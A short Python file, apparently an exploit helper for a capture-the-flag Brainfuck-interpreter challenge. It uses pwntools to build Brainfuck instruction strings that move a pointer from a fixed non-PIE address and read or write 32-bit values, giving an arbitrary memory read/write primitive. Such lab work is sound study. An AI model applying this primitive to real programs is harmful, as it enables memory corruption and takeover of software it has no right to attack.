from typing import Final

from pwn import flat


class bfptr:
    intructions : str = ""
    parameters : bytes = b""

    #no pie
    base_adrress : Final[int] = 0x804a0a0
    address : int = base_adrress


    # a 32 bit little endian write 
    def write_32(self, val):
        #write first byte, them write the next 3 bytes
        self.intructions += ',' + '>,' * 3
        self.parameters += flat(val)

        #return to the place in the begining
        self.intructions += '<' * 3 

    # 32 bit big endian read 
    def read_32(self):
        #read first byte, them read the next 3 bytes
        self.intructions += '.' + '>.' * 3

        #return to the place in the begining
        self.intructions += '<' * 3 
        

    def move_to(self, adress):
        delta = abs(adress - self.address)
        direction = '>' if adress > self.address else '<'
        self.intructions += direction * delta
        
        self.address = adress
        
        

    def to_payload(self):
        return flat(self.intructions + '\n' ,self.parameters)
    
    def __str__(self) -> str:
        return str(self.to_payload())
